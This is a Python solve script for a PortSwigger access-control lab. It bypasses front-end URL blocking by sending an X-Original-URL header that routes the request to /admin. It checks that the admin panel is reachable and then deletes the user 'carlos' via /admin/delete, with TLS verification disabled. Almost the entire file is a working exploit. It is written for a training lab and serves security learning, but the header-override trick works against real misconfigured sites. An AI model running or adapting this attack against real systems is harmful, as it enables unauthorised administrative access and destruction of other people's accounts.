#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
URL-based access control can be circumvented.

Bypasses front-end URL blocking by using X-Original-URL header to route
the back-end to /admin/delete while the outer URL is /.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def bypass_delete(session: requests.Session, lab: str, target: str) -> None:
    headers = {"X-Original-URL": "/admin/delete"}
    r = session.get(f"{lab}/", params={"username": target}, headers=headers)
    if r.ok:
        print(f"[+] Deleted '{target}'. Lab solved.")
    else:
        print(f"[-] Unexpected status {r.status_code}")


def verify_bypass(session: requests.Session, lab: str) -> bool:
    headers = {"X-Original-URL": "/admin"}
    r = session.get(f"{lab}/", headers=headers)
    return "Admin panel" in r.text or "carlos" in r.text


def main():
    parser = argparse.ArgumentParser(
        description="Solve Access Control Lab 10 (URL-based bypass via X-Original-URL)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--target", default="carlos")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print("[*] Verifying X-Original-URL bypass works...")
    if verify_bypass(s, lab):
        print("[*] Bypass confirmed — admin panel accessible")
    else:
        print("[!] Bypass may not have worked — proceeding anyway")

    print(f"[*] Deleting '{args.target}' via X-Original-URL: /admin/delete ...")
    bypass_delete(s, lab, args.target)


if __name__ == "__main__":
    main()
